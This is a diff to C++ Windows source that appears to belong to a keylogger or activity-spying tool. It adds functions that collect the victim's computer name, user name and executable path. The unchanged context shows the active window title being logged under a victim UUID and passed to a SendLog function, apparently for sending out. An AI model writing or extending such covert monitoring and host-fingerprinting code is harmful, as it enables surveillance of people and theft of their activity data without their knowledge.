@@ -6,21 +6,38 @@ string Uuid = "00000000-0000-0000-0000-000000000000";
 string GetCurrentDate() {
     time_t now = time(nullptr);
     struct tm tstruct = *localtime(&now);
-    
+
     char timestamp[20];
     strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %X", &tstruct);
     return timestamp;
 }
 
+string GetComputername() {
+    TCHAR strComputerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD computername_len = sizeof(strComputerName);
+    return !GetComputerName(strComputerName, &computername_len) ? "Unknown" : strComputerName;
+}
+
+string GetCurrentPath() {
+    TCHAR buffer[MAX_PATH];
+    GetModuleFileName(nullptr, buffer, MAX_PATH);
+    return buffer;
+}
+
+string GetUsername() {
+    TCHAR strUsername[512];
+    DWORD username_len = sizeof(strUsername);
+    return !GetUserName(strUsername, &username_len) ? "Unknown" : strUsername;
+}
+
 string GenerateUUID() {
-    stringstream id;
+    stringstream ss;
     srand((unsigned int)time(nullptr));
 
     for (int i = 0; i < 32; i++) {
-        id << uppercase << hex << rand() % 16;
-        if (i == 7 || i == 11 || i == 15 || i == 19) id << '-';
+        ss << uppercase << hex << rand() % 16;
+        if (i == 7 || i == 11 || i == 15 || i == 19) ss << '-';
     }
-    
     return ss.str();
 }
 
@@ -38,5 +55,5 @@ void CheckWindowChange(string &log_text) {
         SendLog(log_text, GetCurrentDate());
         log_text += "[" + Uuid + "] :: [" + current_window + "] :: [" + GetCurrentDate() + "]\r\n";
         last_window = current_window;
-    }    
+    }
 }
